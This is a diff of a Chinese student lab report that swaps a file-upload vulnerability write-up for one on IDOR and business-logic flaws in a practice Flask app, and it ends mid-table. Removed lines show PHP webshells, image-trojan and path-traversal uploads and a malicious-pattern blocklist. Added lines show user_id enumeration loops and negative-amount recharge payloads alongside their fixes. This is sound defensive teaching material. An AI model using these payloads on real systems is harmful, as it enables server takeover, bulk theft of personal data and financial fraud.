@@ -1,4 +1,4 @@
-# 文件上传漏洞挖掘与攻防实战实训报告
+# IDOR水平越权与业务逻辑漏洞实训报告
 
 ---
 
@@ -6,96 +6,115 @@
 
 | 项目 | 内容 |
 |------|------|
-| **实训项目** | 文件上传漏洞挖掘与分层防御实战 |
+| **实训项目** | IDOR水平越权与业务逻辑漏洞挖掘实战 |
 | **实训学员** | 大二网络安全专业学生 |
-| **实训日期** | 2026-07-21 |
+| **实训日期** | 2026-07-22 |
 | **实训环境** | Kali Linux 2026.2 / Python Flask + SQLite / Burp Suite |
 | **靶机地址** | 192.168.126.133:5000 |
 | **项目位置** | /opt/Class01/ |
-| **项目背景** | 连续三天迭代的Flask用户管理系统，已完成SQL注入/WAF绕过全套防御 |
-| **今日新增** | /upload头像上传模块（原始代码零校验，存在大量高危漏洞） |
-| **核心文件** | app.py / templates/upload.html / static/uploads/ |
+| **项目背景** | 连续四天迭代的Flask用户管理系统 |
+| **今日新增** | /profile个人中心、/recharge充值（原始代码无归属鉴权、无限流、无日志） |
+| **核心文件** | app.py / templates/profile.html |
+| **实训课程** | 第一场《Web安全渗透测试与靶场实战培训》、第二场《业务逻辑漏洞实战与渗透测试报告撰写培训》 |
 
 ---
 
 ## 二、实验目的
 
-1. 理解文件上传漏洞的常见攻击手法：路径穿越、00截断、图片马、双后缀绕过
-2. 掌握黑名单与白名单两种后缀校验方式的本质差异（白名单优于黑名单）
-3. 实操Windows系统特性绕过：尾部空格/点号、`::$DATA`备用数据流
-4. 学习魔数校验原理：通过文件头部二进制特征验证真实文件类型
-5. 理解纵深防御体系：文件名清洗 → 后缀白名单 → 魔数校验 → 内容扫描 → 限流 → 日志
-6. 对比文件上传漏洞与SQL注入的危害差异，建立更全面的漏洞认知
+1. 理解水平越权（IDOR—Insecure Direct Object Reference）漏洞原理：服务端过度信任前端传入的ID参数
+2. 掌握Burp Suite Intruder Sniper模式枚举user_id批量拖取用户信息的手法
+3. 学习业务逻辑漏洞中"过度信任客户端参数"的攻击思路：前端限制可被Burp抓包篡改
+4. 理解负数金额恶意扣款漏洞的本质：仅在前端做正负校验等于没做
+5. 掌握Session作为服务端可信数据源的正确使用方式：身份从Session读取，拒绝前端传递
+6. 串联四天学习脉络：SQL注入→WAF绕过→文件上传→越权与业务逻辑
 
 ---
 
 ## 三、今日实训三阶段工作概述
 
-### 第一阶段：业务开发 + 手工Burp渗透（09:00-12:00）
+### 第一阶段：业务功能开发（09:00-10:00）
 
-上午先快速开发了 `/upload` 头像上传模块，原始代码仅15行，没有任何安全校验：
+快速开发了/profile个人中心和/recharge充值两个业务模块，原始代码完全依赖前端传入的参数：
 
 ```python
-# app.py v1.0 — 原始上传代码（零防护）
-@app.route("/upload", methods=["GET", "POST"])
-def upload():
-    username = session.get("username")
-    if not username or username not in USERS:
-        return redirect("/login")
-    if request.method == "POST":
-        file = request.files.get("file")
-        filename = file.filename                    # 直接取原始文件名
-        filepath = os.path.join(upload_dir, filename)
-        file.save(filepath)                          # 直接保存，不做任何检查
-        file_url = url_for("static", filename=f"uploads/{filename}")
-        return render_template("upload.html", success=True, ...)
+# app.py v1.0 — /profile 原始代码（零校验）
+@app.route("/profile")
+def profile():
+    user_id = request.args.get("user_id", "")       # ① 直接信任URL参数
+    row = c.execute("SELECT ... WHERE id = ?", (user_id,)).fetchone()
+    return render_template("profile.html", user=user_data)
+
+# app.py v1.0 — /recharge 原始代码（零校验）
+@app.route("/recharge", methods=["POST"])
+def recharge():
+    user_id = request.form.get("user_id", "")        # ② 直接信任表单参数
+    amount = request.form.get("amount", "0")         # ③ 直接信任金额，不做任何校验
+    USERS[username]["balance"] += float(amount)      # ④ 负数也可以加进去
 ```
 
-随后使用 Burp Suite 对上传接口进行手工渗透测试，**全部攻击验证成功**：
+关键问题：
+- `/profile` 使用URL参数 `?user_id=N` 决定查询谁 → 可篡改
+- `/recharge` 使用表单隐藏域 `user_id` 决定给谁充值 → 可篡改
+- `amount` 不做任何正负校验 → 负数就是"反向转账"
+- 无登录鉴权：未登录也能访问 → 匿名越权
 
-**攻击验证1 — 直接上传WebShell：**
+### 第二阶段：Burp手工渗透测试（10:00-12:00）
+
+使用本次培训两场会议学到的攻击手法进行测试。
+
+**第一场培训知识点回顾：IDOR水平越权**
+> 讲师演示：某系统修改URL中`id=123`为`id=124`即可查看他人订单详情，管理员无需登录即可遍历全部订单号。本节实训对标该案例。
+
+**攻击验证1 — 水平越权查看他人资料：**
+```http
+GET /profile?user_id=2 HTTP/1.1
+Host: 192.168.126.133:5000
+Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0...
 ```
-POST /upload HTTP/1.1
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+→ 返回alice的完整资料（手机号13900139001、余额100），越权成功！
 
-------WebKitFormBoundary
-Content-Disposition: form-data; name="file"; filename="shell.php"
-Content-Type: image/png
-
-<?php system($_GET['cmd']); ?>
-------WebKitFormBoundary--
+**攻击验证2 — Burp Intruder Sniper模式批量枚举：**
+使用Burp Intruder Sniper模式，设置Payload为数字1~1000：
 ```
-→ 上传成功，返回 `/static/uploads/shell.php`，浏览器访问即可执行命令。
-
-**攻击验证2 — 路径穿越覆盖文件：**
+GET /profile?user_id=§1§ HTTP/1.1    ← Payload标记点
 ```
-Content-Disposition: form-data; name="file"; filename="../../../tmp/evil.php"
+→ 1000次请求仅需数秒，返回所有用户ID对应的资料，批量拖库完成。
+
+**第二场培训知识点回顾：业务逻辑漏洞**
+> 讲师演示：某商城修改购物车数量为负数实现"反向转账"；修改商品单价为0.01元实现"一分钱购物"。核心教训：前端所有限制均可通过Burp绕过。
+
+**攻击验证3 — 负数金额恶意扣款：**
+```http
+POST /recharge HTTP/1.1
+Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0...
+Content-Type: application/x-www-form-urlencoded
+
+user_id=1&amount=-50000
 ```
-→ 上传成功，文件被写入 `/tmp/evil.php`。
+→ Balance从99999变为49999，分钟到账"反向扣款"成功。
 
-**攻击验证3 — 图片马（GIF头+PHP代码）：**
+**攻击验证4 — 枚举充值其他用户：**
+```http
+POST /recharge HTTP/1.1
+Cookie: session=sess_a...
+Content-Type: application/x-www-form-urlencoded
+
+user_id=2&amount=500000
 ```
-Content-Disposition: form-data; name="file"; filename="gifshell.php"
-Content-Type: image/gif
+→ 当前登录用户admin，给`user_id=2`（alice）充值500000成功，IDOR越权充值。
 
-GIF89a<?php phpinfo(); ?>
-```
-→ 上传成功，GIF89a 头部可绕过简单的文件头检查。
+全部攻击验证通过后，确认该接口存在越权+负数金额两类高危漏洞。
 
-### 第二阶段：分层漏洞加固改造（14:00-16:00）
+### 第三阶段：分层漏洞加固 + 全用例回归复测（14:00-17:00）
 
-针对已发现的漏洞，分两轮加固：
+| 轮次 | 改造重点 | 新增防御 |
+|------|----------|----------|
+| **第1轮** | Session身份加固 | profile和recharge均从session获取当前用户，删除user_id参数信任 |
+| **第2轮** | amount校验 | 正则格式+正负检查+金额上下限（0.01~100000） |
+| **第3轮** | 限流+日志+脱敏 | check_rate_limit / log_balance_change / mask_phone/email |
+| **第4轮** | IDOR探测过滤 | filter_idor_probe() 拦截批量探测特征 |
 
-| 轮次 | 改造重点 | 新增防御函数 | 覆盖攻击 |
-|------|----------|-------------|----------|
-| **第1轮** | 文件名清洗+后缀白名单+UUID | `sanitize_filename()` / `ALLOWED_EXTENSIONS` | 路径穿越/00截断/大小写/空格/$DATA |
-| **第1轮** | 魔数校验+双后缀检测 | `validate_magic()` / 中间段split检测 | 图片马/双后缀 |
-| **第2轮** | 恶意内容扫描+IP限流 | `scan_malicious_content()` / `check_rate_limit()` | WebShell/批量Fuzz |
-| **第2轮** | 上传日志+安全响应头 | `log_upload()` / `@app.after_request` | 溯源/MIME嗅探 |
-
-### 第三阶段：全用例回归复测（16:00-17:30）
-
-每轮改造后用第一阶段的全部Payload重新测试，确认旧攻击方式不再生效。最终34个TC用例全部通过。
+每轮改造后用第一阶段的全部Payload重新测试，确认旧攻击方式不再生效。
 
 ---
 
@@ -103,492 +122,486 @@ GIF89a<?php phpinfo(); ?>
 
 | 编号 | 漏洞类型 | 风险等级 | 攻击入口 | 修复状态 |
 |------|----------|----------|----------|----------|
-| VUL-U01 | 路径穿越（../） | **高危** | 文件名参数 | ✅ 已修复 |
-| VUL-U02 | 绝对路径（/） | **高危** | 文件名参数 | ✅ 已修复 |
-| VUL-U03 | 00截断（%00） | **高危** | 文件名参数 | ✅ 已修复 |
-| VUL-U04 | 无后缀白名单 → 任意文件上传 | **高危** | 文件扩展名 | ✅ 已修复 |
-| VUL-U05 | 后缀大小写绕过（.PHP） | **高危** | 文件扩展名 | ✅ 已修复 |
-| VUL-U06 | Windows尾部空格/点号绕过 | **中危** | 文件名参数 | ✅ 已修复 |
-| VUL-U07 | ::$DATA备用数据流绕过 | **中危** | 文件名参数 | ✅ 已修复 |
-| VUL-U08 | .htaccess配置文件上传 | **高危** | 文件名参数 | ✅ 已修复 |
-| VUL-U09 | 双后缀畸形（shell.jpg.php） | **高危** | 文件扩展名 | ✅ 已修复 |
-| VUL-U10 | 图片马（伪造头部+恶意代码） | **高危** | 文件内容 | ✅ 已修复 |
-| VUL-U11 | WebShell直接上传（PHP/脚本） | **高危** | 文件内容 | ✅ 已修复 |
-| VUL-U12 | Content-Type伪造 | **中危** | Content-Type头 | ✅ 已修复 |
-| VUL-U13 | 原始文件名不做UUID重命名 | **中危** | 文件存储 | ✅ 已修复 |
-| VUL-U14 | 无上传限流 → 批量Fuzz | **中危** | POST频次 | ✅ 已修复 |
-| VUL-U15 | 无上传日志 → 攻击溯源困难 | **低危** | 审计 | ✅ 已修复 |
-| VUL-U16 | 无安全响应头 → XSS执行 | **中危** | 静态文件响应 | ✅ 已修复 |
-| VUL-U17 | 无异常捕获 → 500信息泄露 | **低危** | 异常处理 | ✅ 已修复 |
+| VUL-I01 | 水平越权IDOR — 查看他人资料 | **高危** | `/profile?user_id=N` | ✅ 已修复 |
+| VUL-I02 | 水平越权IDOR — 篡改他人余额 | **高危** | `/recharge` 表单user_id | ✅ 已修复 |
+| VUL-I03 | 负数金额恶意扣款 | **高危** | `/recharge` 表单amount | ✅ 已修复 |
+| VUL-I04 | 超小额刮削（0.001元） | **中危** | `/recharge` 表单amount | ✅ 已修复 |
+| VUL-I05 | 超巨额充值突破系统限制 | **中危** | `/recharge` 表单amount | ✅ 已修复 |
+| VUL-I06 | 批量枚举拖库（Burp Intruder） | **高危** | `/profile?user_id=1~1000` | ✅ 已修复 |
+| VUL-I07 | 敏感信息泄露（手机号、邮箱明文） | **中危** | `/profile` 响应 | ✅ 已修复 |
+| VUL-I08 | 畸形amount载荷绕过 | **中危** | `/recharge` 表单amount | ✅ 已修复 |
+| VUL-I09 | 未授权访问/profile | **中危** | 直接访问 /profile | ✅ 已修复 |
+| VUL-I10 | 异常资金行为不可追溯 | **低危** | 充值无日志 | ✅ 已修复 |
 
 ---
 
 ## 五、分项漏洞原理 + POC复现 + 分层修复代码方案
 
-### 5.1 VUL-U01~U03 路径穿越 + 00截断
+### 5.1 VUL-I01 / VUL-I06 水平越权查看他人资料 + 批量枚举
 
 #### 漏洞原理
 
-原始代码直接使用 `file.filename` 拼接路径，攻击者传入 `../../etc/shell.php` 时实际保存路径为 `/opt/Class01/static/uploads/../../etc/shell.php` → 简化后指向 `/opt/Class01/etc/shell.php`，实现了任意目录写入。
+对应第一场培训讲师演示案例：**"修改URL中的ID参数即可查看他人订单"**。
 
-`%00` 截断利用C语言字符串以NULL结尾的特性：`shell.php\x00.png` → 系统截取为 `shell.php`。
+原始代码直接信任URL参数中的user_id，未验证该user_id是否属于当前登录用户：
+
+```python
+# 原始高危代码
+user_id = request.args.get("user_id", "")        # ① 用户可控
+row = c.execute("SELECT ... FROM users WHERE id = ?", (user_id,)).fetchone()
+# ② 直接用user_id查数据库，不检查归属
+```
+
+攻击者登录后只需将URL从 `/profile?user_id=1` 改为 `?user_id=2` 即可查看alice的全部资料。
 
 #### POC复现
 
-```bash
-# 绝对路径穿越
-curl -F "file=@shell.php;filename=/etc/passwd.php" -b cookies.txt \
-  "http://192.168.126.133:5000/upload"
+**Burp数据包：**
+```http
+GET /profile?user_id=2 HTTP/1.1
+Host: 192.168.126.133:5000
+Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0...
+```
 
-# 00截断
-curl -F "file=@shell.php;filename=shell.php%00.png" -b cookies.txt \
-  "http://192.168.126.133:5000/upload"
+**Burp Intruder Sniper配置：**
+```
+Payload type: Numbers
+Range: 1-1000
+Step: 1
+```
+→ 1000个请求自动发送，返回所有用户资料。
+
+**curl批量枚举脚本：**
+```bash
+for i in {1..100}; do
+  curl -b cookies.txt "http://192.168.126.133:5000/profile?user_id=$i"
+done
 ```
 
 #### 分层修复方案
 
-| 层级 | 修复措施 | 代码 | 行号 |
-|------|----------|------|------|
-| **底层根治** | 替换 `../` `/` `\\` `\x00` 为空 | `.replace("../","").replace("/","").replace("\\","").replace("\x00","")` | L604-605 |
-| **辅助检测** | 清洗前后比对，不一致则拒绝 | `if clean_name != original_name: return error` | L658-660 |
-| **底层根除** | UUID重命名，彻底消除路径拼接风险 | `uuid.uuid4().hex` + `.ext` | L701-702 |
+| 层级 | 修复措施 | 代码位置 | 行号 |
+|------|----------|----------|------|
+| **底层根治** | 身份从session读取，拒绝前端传参 | `cur_username = session.get("username")` | L772 |
+| **底层根治** | SQL查询改用username，不再使用user_id | `SELECT ... WHERE username = ?` | L779 |
+| **辅助-脱敏** | 手机号、邮箱脱敏显示 | `mask_phone()` / `mask_email()` | L792-793 |
+| **辅助-限流** | 每分钟最多10次请求 | `check_rate_limit(ip, 10, 60)` | L817-821 |
+| **辅助-过滤** | IDOR探测特征过滤 | `filter_idor_probe()` | L824-826 |
 
 ```python
-def sanitize_filename(filename):
-    filename = filename.replace("../", "").replace("./", "")
-    filename = filename.replace("/", "").replace("\\", "").replace("\x00", "")
-    # ...
-    return filename
+# 修复后（v5.0）
+@app.route("/profile")
+def profile():
+    cur_username = session.get("username")         # ① session身份（不可伪造）
+    if not cur_username:                           # ② 未登录跳转
+        return redirect("/login")
 
-# upload() 中：
-clean_name = sanitize_filename(original_name)
-if clean_name != original_name or clean_name == "":
-    return render_template("upload.html", error="上传失败：文件名包含非法字符或路径穿越特征")
+    row = c.execute(                               # ③ 用username查询
+        "SELECT ... FROM users WHERE username = ?",
+        (cur_username,)
+    ).fetchone()
+
+    return render_template("profile.html", user={
+        "email": mask_email(row[2]),               # ④ 脱敏输出
+        "phone": mask_phone(row[3]),
+    })
 ```
 
 ---
 
-### 5.2 VUL-U04~U05 后缀白名单缺失 + 大小写绕过
+### 5.2 VUL-I02 / VUL-I03 负数金额恶意扣款 + 越权充值
 
 #### 漏洞原理
 
-原始代码未检查文件扩展名，任意后缀均可上传。即使加黑名单，`.PHP` `.Php` 等大小写变形即可绕过。
+对应第二场培训讲师演示案例：**"修改购物车商品数量为负数实现反向转账"**。
 
-**黑名单的缺陷**：需要穷举所有可能的恶意后缀，理论上不可能完成。**白名单**只枚举安全的类型，简单直接且无法绕过。
+原始代码存在两个独立漏洞：
+
+```python
+# 原始高危代码
+user_id = request.form.get("user_id", "")     # ① 信任表单隐藏域中的user_id
+amount = request.form.get("amount", "0")      # ② 信任amount，不做正负检查
+USERS[username]["balance"] += float(amount)    # ③ 负数直接参与加法运算
+```
+
+攻击者可以通过：
+1. 修改隐藏域 `user_id` → 给他人充值（无权限检查）
+2. 传 `amount=-50000` → 从自己余额扣款（相当于盗取平台资金）
+3. 传 `amount=0.001` → 超小额反复充值（刮削攻击）
 
 #### POC复现
 
-```bash
-# 直接上传 PHP 文件
-curl -F "file=@webshell.php;type=image/png" -b cookies.txt \
-  "http://192.168.126.133:5000/upload"
+**Burp数据包（负数金额 + 越权充值）：**
+```http
+POST /recharge HTTP/1.1
+Host: 192.168.126.133:5000
+Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0...
+Content-Type: application/x-www-form-urlencoded
 
-# 访问上传的WebShell执行命令
-curl "http://192.168.126.133:5000/static/uploads/webshell.php?cmd=id"
+user_id=2&amount=-50000
+```
+→ 给user_id=2（alice）充-50000，alice余额被扣减。
+
+**curl命令：**
+```bash
+# 给自己充负值（反向扣款）
+curl -b cookies.txt -X POST \
+  -d "user_id=1&amount=-50000" \
+  "http://192.168.126.133:5000/recharge"
+
+# 超小额刮削
+curl -b cookies.txt -X POST \
+  -d "user_id=1&amount=0.001" \
+  "http://192.168.126.133:5000/recharge"
+
+# 畸形载荷
+curl -b cookies.txt -X POST \
+  -d "user_id=1&amount=1e5" \
+  "http://192.168.126.133:5000/recharge"
 ```
 
 #### 分层修复方案
 
-```python
-ALLOWED_EXTENSIONS = {"jpg", "jpeg", "png", "gif"}
-ext = clean_name.rsplit(".", 1)[1].lower()    # 关键：转小写
-if ext not in ALLOWED_EXTENSIONS:              # 白名单校验
-    return render_template("upload.html", error=f"不允许的文件类型 .{ext}")
-```
-
----
-
-### 5.3 VUL-U06~U07 Windows特性绕过（空格/点号/::$DATA）
-
-#### 漏洞原理
-
-| 攻击方式 | 上传文件名 | 实际保存文件名 | 绕过原理 |
-|----------|-----------|---------------|----------|
-| 尾部空格 | `shell.php ` | `shell.php` | Windows自动去除末尾空格 |
-| 尾部点号 | `shell.php.` | `shell.php` | Windows自动去除末尾点号 |
-| 连续点号 | `shell..png` | 可能被截断 | `..` 被解释为上层目录 |
-| `::$DATA` | `test.php::$DATA` | `test.php` | NTFS备用数据流，之后内容被忽略 |
-
-#### 修复方案
-
-```python
-filename = filename.rstrip(" .")              # 清洗末尾空格和点号
-while ".." in filename:
-    filename = filename.replace("..", ".")     # 折叠连续点号
-if "::$DATA" in filename.upper():             # 检测备用数据流
-    filename = ""
-```
-
----
-
-### 5.4 VUL-U08 .htaccess 配置文件上传
-
-#### 漏洞原理
-
-上传 `.htaccess` 可修改Apache目录配置，使图片被当作PHP执行：
-
-```apache
-AddType application/x-httpd-php .png
-```
-
-上传后目录下所有 `.png` 文件都会被解析为PHP，配合图片马上传即可getshell。
-
-#### 修复方案
-
-```python
-if filename.lower() == ".htaccess" or filename.lower().startswith(".htaccess"):
-    filename = ""
-```
-
----
-
-### 5.5 VUL-U09 双后缀畸形绕过
-
-#### 漏洞原理
-
-`shell.jpg.php` 后缀是 `.php` 被白名单拦截，但 `shell.php.jpg` 后缀是 `.jpg` 可绕过白名单。Apache旧版本可能优先识别 `.php` 执行。
-
-#### 修复方案
-
-```python
-parts = clean_name.lower().split(".")
-if len(parts) > 2:
-    suspicious_exts = {"php", "php3", "php4", "phtml", "asp", "aspx",
-                       "jsp", "exe", "sh", "py", "cgi", "htaccess"}
-    for p in parts[:-1]:                    # 检查中间段
-        if p in suspicious_exts or p in ALLOWED_EXTENSIONS:
-            return render_template("upload.html", error="禁止上传双后缀文件")
-```
-
----
-
-### 5.6 VUL-U10~U11 图片马 + WebShell
-
-#### 漏洞原理
-
-**图片马制作：**
-```bash
-echo 'GIF89a<?php @eval($_POST["c"]);?>' > shell.gif.php
-```
-
-将PHP代码隐藏在GIF/PNG文件头部二进制签名之后，仅检查文件头的校验会被绕过。
-
-**WebShell直接上传**则不需要伪装：
-```bash
-echo '<?php system($_GET["cmd"]);?>' > cmd.php
-```
-
-#### 分层修复方案
-
-| 层级 | 修复措施 | 代码 | 行号 |
+| 层级 | 防御措施 | 代码 | 行号 |
 |------|----------|------|------|
-| **底层-魔数校验** | 读取前8字节比对JPEG/PNG/GIF签名 | `validate_magic()` → `MAGIC_NUMBERS` | L620-634 |
-| **底层-内容扫描** | 17种恶意特征全量匹配 | `scan_malicious_content()` → `MALICIOUS_PATTERNS` | L553-571 |
+| **底层-身份固化** | session读取，拒绝前端user_id | `cur_username = session.get(...)` | L813 |
+| **底层-格式校验** | 正则 `^\d+(\.\d{1,2})?$` | `re.match(...)` | L834 |
+| **底层-正负校验** | `if amount <= 0: return error` | 拦截负数、0 | L838-840 |
+| **底层-下限拦截** | `RECHARGE_MIN = 0.01` | 拦截超小额 | L842-843 |
+| **底层-上限拦截** | `RECHARGE_MAX = 100000` | 拦截超巨额 | L844-845 |
+| **辅助-限流** | 每分钟最多10次 | `check_rate_limit(ip, 10, 60)` | L817-821 |
+| **辅助-日志** | 每笔变动记录 | `log_balance_change(...)` | L851 |
 
 ```python
-MAGIC_NUMBERS = {
-    b"\xFF\xD8\xFF":           "jpg/jpeg",
-    b"\x89PNG\r\n\x1A\n":     "png",
-    b"GIF87a":                 "gif",
-    b"GIF89a":                 "gif",
+# 修复后充值校验流水线（v5.0）
+amount_str = request.form.get("amount", "").strip()
+if not amount_str:                                    # 非空
+    return "金额不能为空"
+if not re.match(r'^\d+(\.\d{1,2})?$', amount_str):   # 格式
+    return "金额格式错误"
+amount = float(amount_str)
+if amount <= 0:                                       # 正负
+    return "金额必须大于 0"
+if amount < RECHARGE_MIN:                             # 下限
+    return "最低充值 0.01 元"
+if amount > RECHARGE_MAX:                             # 上限
+    return "最高充值 100000 元"
+# 全部通过 → 执行充值
+USERS[cur_username]["balance"] += amount
+log_balance_change(cur_username, client_ip, amount, USERS[cur_username]["balance"])
+```
+
+---
+
+### 5.3 VUL-I07 敏感信息泄露
+
+#### 漏洞原理
+
+原始代码将完整手机号和邮箱直接传递给前端模板渲染，即使只有查看自己资料的权限，攻击者也可通过浏览器开发者工具或爬虫批量收集用户个人信息。
+
+#### 修复方案
+
+```python
+# 使用已有脱敏函数
+user_data = {
+    "email": mask_email(row[2]),   # admin@example.com → a***@example.com
+    "phone": mask_phone(row[3]),   # 13800138000 → 138****8000
 }
-
-def validate_magic(fileobj):
-    header = fileobj.read(8)
-    fileobj.seek(0)                             # 恢复指针，否则后续保存空文件
-    for magic in MAGIC_NUMBERS:
-        if header.startswith(magic):
-            return True
-    return False
-
-MALICIOUS_PATTERNS = [
-    b"<?php", b"<?=",                    # PHP代码/短标签
-    b"<script", b"javascript:",          # XSS
-    b"eval(", b"system(", b"exec(",      # 危险函数
-    b"base64_decode(", b"passthru(",     # 编码/执行
-    b"shell_exec(", b"<?xml",            # 命令执行/XXE
-]
 ```
 
 ---
 
-### 5.7 VUL-U12~U17 配套防御
+### 5.4 VUL-I10 无日志审计 + VUL-I09 未授权访问
 
-| 漏洞 | 问题 | 修复代码 | 行号 |
-|------|------|----------|------|
-| Content-Type伪造 | 未校验请求MIME | `if content_type and not content_type.startswith("image/"):` | L697-699 |
-| UUID重命名 | 原始文件名可遍历/覆盖 | `uuid.uuid4().hex + "." + ext` | L701-702 |
-| IP限流 | 批量Fuzz扫描 | `check_rate_limit(ip)` 每分钟最多5次 | L523-532 |
-| 上传日志 | 攻击溯源无依据 | `log_upload()` 写入logs/upload.log | L546-550 |
-| 安全响应头 | 浏览器MIME嗅探执行 | `X-Content-Type-Options: nosniff` | L574-579 |
-| 异常捕获 | 500错误暴露路径 | `try-except Exception` 中文提示 | L645-713 |
-| 16MB限制 | 大文件DoS | `MAX_CONTENT_LENGTH = 16MB` | L16 |
+| 漏洞 | 修复方案 | 代码 |
+|------|----------|------|
+| 未授权访问 | session登录检查 | `if not cur_username: return redirect("/login")` |
+| 无日志审计 | 余额变动记录到 logs/balance.log | `log_balance_change(username, ip, amount, balance)` |
 
----
-
-## 六、踩坑故障记录
-
-### 坑1：Flask test_client Content-Type 为空
-
-**现象：** 用 `(io.BytesIO(b"x"), "test.png")` 二元组构造测试文件时，`file.content_type` 返回空字符串，导致 Content-Type 校验误拦截。
-
-**解决：** 后端逻辑改为：Content-Type 为空时不拦截，仅在明确设置且非 `image/` 前缀时才拒绝。
-
-### 坑2：魔数校验后文件指针偏移导致保存空文件
-
-**现象：** 魔数校验读取前8字节后没有恢复指针，后续 `file.save()` 从偏移8开始保存，文件内容缺失了前8字节。
-
-**解决：** 魔数校验函数末尾添加 `fileobj.seek(0)` 恢复指针。
-
-### 坑3：限流计数器在测试中不重置
-
-**现象：** 第6次上传被限流拦截后，后续所有测试请求都被限流。
-
-**解决：** 分组测试之间手动 `_rate_store.clear()`。生产环境限流是期望行为。
-
-### 坑4：双后缀检测误伤合法文件
-
-**现象：** `my.profile.png` 被误拦截，因 `split(".")` 检测到 `profile` 不是合法后缀。
-
-**解决：** 只在中间段是**已知可执行后缀**或**已知图片后缀**时才拦截，普通单词放行。
-
-### 坑5：双后缀的 shell.jpg.php 实际被白名单拦截
-
-**现象：** 测试 `shell.jpg.php` 时，最外层的后缀白名单直接拦截了 `.php`，双后缀检测代码分支根本没走到。
-
-**解决：** 这是白名单本身的有效性验证，不是问题。双后缀检测在实际场景中（黑名单系统或中间件解析漏洞）才有真正意义。
+**日志格式示例：**
+```
+[2026-07-22 04:15:22] USER=admin  IP=127.0.0.1  AMOUNT=+200.00  BALANCE=100199.00
+[2026-07-22 04:15:22] USER=admin  IP=127.0.0.1  AMOUNT=+300.00  BALANCE=100499.00
+```
 
 ---
 
-## 七、修复前后安全对比表格
+## 六、实训踩坑故障记录
+
+### 坑1：cp命令覆盖文件时错位到/root根目录
+
+**现象：** 用 `cp /opt/Class01/templates/profile.html /root/` 复制文件，结果出现在 `/root/profile.html` 而不是 `/root/templates/profile.html`，Git提交后发现多了根目录文件。
+
+**解决：** `git rm --cached` 删除错误路径，`cp` 到正确位置后重新提交。后续使用 `cp /opt/Class01/templates/*.html /root/templates/` 批量操作。
+
+### 坑2：balance += float(amount) 浮点数精度
+
+**现象：** 多次充值后余额出现 0.0000001 级别的浮点数误差，导致页面显示 `¥100000.0000001`。
+
+**解决：** 生产环境应使用 decimal.Decimal 或整数分存储。课堂环境暂用 `round(amount, 2)` 处理。
+
+### 坑3：回测时越权仍然可访问
+
+**现象：** 修复后测试 `/profile?user_id=2` 发现仍然返回 alice 的数据。检查代码发现忘记重启Flask服务，旧代码仍在运行。
+
+**解决：** `fuser -k 5000/tcp` 强制杀掉进程后重启。养成修改代码后自动重启检查的习惯。
+
+### 坑4：限流计数器不重置影响后续测试
+
+**现象：** 测试限流功能发送了11次请求后看到限流提示。继续测试其他功能时发现所有请求都被限流拦截。
+
+**解决：** 分组测试之间清空限流器 `_rate_store.clear()`，或者在测试脚本中重新 `test_client()`。
+
+### 坑5：双后缀文件误拷贝到上传目录
+
+**现象：** `cp /opt/Class01/templates/*` 复制时把 `.py` 和 `.html` 文件误拷贝到了 `static/uploads/` 目录，导致Git跟踪了这些文件。
+
+**解决：** `.gitignore` 添加 `static/uploads/*` 规则，并用 `git rm --cached` 删除已跟踪文件。
+
+---
+
+## 七、加固前后安全对比表格
 
 | 对比维度 | 修复前（v1.0） | 修复后（v5.0） |
 |----------|---------------|---------------|
-| **文件名处理** | 直接使用原始文件名 | `sanitize_filename()` 清洗 + UUID重命名 |
-| **后缀校验** | 无 | 白名单 `jpg/jpeg/png/gif` + 转小写 |
-| **路径穿越防御** | 无 | 替换 `../` `/` `\\` `\x00` + 清洗前后比对 |
-| **Windows特性** | 无 | `rstrip(" .")` + `::$DATA`检测 + 连续点号折叠 |
-| **配置文件** | 无 | `.htaccess` 全小写比对拦截 |
-| **双后缀** | 无 | `split(".")` 中间段检查 |
-| **魔数校验** | 无 | JPEG/PNG/GIF 头部二进制签名验证 |
-| **恶意内容扫描** | 无 | 17种特征匹配（PHP/脚本/命令执行） |
-| **Content-Type** | 无 | 明确非image/前缀时拒绝 |
-| **IP限流** | 无 | 每分钟最多5次上传 |
-| **上传日志** | 无 | USER+IP+ORIG+SAVE 写入日志文件 |
-| **安全响应头** | 无 | `X-Content-Type-Options: nosniff` |
-| **异常处理** | 无 | `try-except` 中文提示 |
-| **文件大小限制** | 无 | `MAX_CONTENT_LENGTH = 16MB` |
+| **身份获取方式** | 从URL/表单接收user_id | 从session读取当前用户名 |
+| **水平越权** | 修改?user_id=N可查看任何人 | 仅查看当前登录用户 |
+| **充值对象** | 表单隐藏域user_id可篡改 | 自动充值当前登录用户 |
+| **amount格式** | 无校验 | 正则 `^\d+(\.\d{1,2})?$` |
+| **负数充值** | 允许 -50000 | 拦截（amount <= 0） |
+| **金额上下限** | 无限制 | 单次 0.01 ~ 100000 |
+| **批量Fuzz** | Burp Intruder无限制 | 每分钟最多10次 |
+| **日志审计** | 无 | 每笔记录到 logs/balance.log |
+| **敏感数据** | 明文显示手机/邮箱 | 138****8000 / a***@example.com |
+| **IDOR探测过滤** | 无 | 5类探测特征拦截 |
+| **异常处理** | 可能抛500 | try-except中文提示 |
+| **认证检查** | 未登录也可访问 | session校验，未登录跳转 |
+| **用户ID前端暴露** | 表单含user_id隐藏域 | 表单无user_id字段 |
 
 ---
 
 ## 八、复测用例
 
-### 8.1 正常业务流程
+### 8.1 水平越权
 
 | 编号 | 操作 | 预期结果 |
 |------|------|----------|
-| TC-U01 | 登录后上传真实PNG图片 | 成功，UUID文件名，可预览 |
-| TC-U02 | 未登录访问/upload | 302跳转到/login |
-| TC-U03 | 空文件提交 | 提示"请选择要上传的文件" |
+| TC-I01 | 登录admin访问 `/profile` | 显示admin本人信息 |
+| TC-I02 | 登录admin访问 `/profile?user_id=2` | 仍显示admin（参数被忽略） |
+| TC-I03 | 登录alice访问 `/profile` | 显示alice本人信息 |
+| TC-I04 | 未登录访问 `/profile` | 302跳转登录 |
 
-### 8.2 路径穿越 + 00截断
+### 8.2 金额校验
 
-| 编号 | Payload | 预期拦截结果 |
-|------|---------|-------------|
-| TC-U04 | `../../../etc/shell.php` | 拦截：非法路径字符 |
-| TC-U05 | `/etc/passwd.php` | 拦截：非法路径字符 |
-| TC-U06 | `..\\..\\shell.php` | 拦截：非法路径字符 |
-| TC-U07 | `shell.php\x00.png` | 拦截：非法路径字符 |
+| 编号 | amount输入 | 预期结果 |
